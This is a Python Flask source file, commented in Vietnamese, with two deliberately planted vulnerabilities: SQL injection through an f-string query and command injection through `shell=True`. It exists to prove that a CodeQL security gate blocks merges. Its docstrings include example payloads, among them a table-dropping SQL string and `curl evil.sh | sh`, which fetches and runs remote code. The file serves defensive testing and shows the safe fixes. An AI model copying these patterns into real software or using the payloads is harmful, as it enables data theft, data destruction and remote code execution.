# ============================================================================ #
# FILE CỐ TÌNH CÓ LỖ HỔNG — DÙNG LÀM EVIDENCE CHO DIRECTIVE #10                #
#                                                                              #
# KHÔNG MERGE. KHÔNG COPY. File này tồn tại để chứng minh một điều duy nhất:   #
# gate `SAST (codeql)` là cổng chặn THẬT, không phải cái nhãn xanh trang trí.  #
#                                                                              #
# Bản đầu của file này KHÔNG làm CodeQL đỏ, dù nó có đúng hai lỗ hổng dưới     #
# đây. Lý do đáng ghi lại: CodeQL không báo lỗi vì "trông thấy code xấu", nó   #
# chỉ báo khi truy được ĐƯỜNG ĐI từ một nguồn dữ liệu do người ngoài điều      #
# khiển tới chỗ nguy hiểm. Bản đầu nhận dữ liệu qua tham số hàm, mà tham số    #
# hàm thì CodeQL không biết ai sẽ truyền vào — không có nguồn thì không có     #
# đường đi, không có đường đi thì không có alert. Nó không sai; nó từ chối     #
# đoán mò. Bản này lấy dữ liệu từ `flask.request`, nguồn mà CodeQL biết chắc   #
# là do người gửi HTTP điều khiển.                                            #
#                                                                              #
# Hai query dưới đây nằm trong bộ mặc định của CodeQL cho Python:              #
#   py/sql-injection            — dữ liệu người dùng chảy vào câu SQL          #
#   py/command-line-injection   — dữ liệu người dùng chảy vào lệnh shell       #
# ============================================================================ #
import os
import sqlite3
import subprocess

from flask import Flask, request, jsonify

app = Flask(__name__)

DB_PATH = os.environ.get("AIOPS_INCIDENT_DB", "incidents.db")


@app.route("/incidents")
def find_incident():
    """Tra sự cố gần nhất của một service.

    LỖ HỔNG 1 — py/sql-injection.
    `service` đi thẳng từ query string vào câu SQL qua f-string. Gọi endpoint
    này với `?service=x' OR '1'='1` là đọc được toàn bộ bảng; với
    `?service=x'; DROP TABLE incidents; --` là mất bảng.

    Cách viết đúng là truyền tham số rời để driver tự escape:
        cur.execute("SELECT ... WHERE service = ?", (service,))
    """
    service = request.args.get("service", "")

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    query = f"SELECT id, service, severity, summary FROM incidents WHERE service = '{service}' ORDER BY id DESC LIMIT 10"
    cur.execute(query)
    rows = cur.fetchall()
    conn.close()

    return jsonify(rows)


@app.route("/pod-logs")
def collect_pod_logs():
    """Lấy log của một pod để đính vào báo cáo sự cố.

    LỖ HỔNG 2 — py/command-line-injection.
    `shell=True` cộng chuỗi ghép nghĩa là shell diễn giải cả nội dung `pod`.
    Gọi với `?pod=mypod; curl evil.sh | sh` là chạy được lệnh tuỳ ý dưới quyền
    của tiến trình này — trên runner CI thì đó là quyền chạm vào token ký.

    Cách viết đúng là bỏ shell đi, truyền danh sách tham số:
        subprocess.run(["kubectl", "logs", pod, "--tail", "200"], check=True)
    """
    pod = request.args.get("pod", "")

    cmd = "kubectl logs " + pod + " --tail 200"
    return subprocess.check_output(cmd, shell=True).decode()
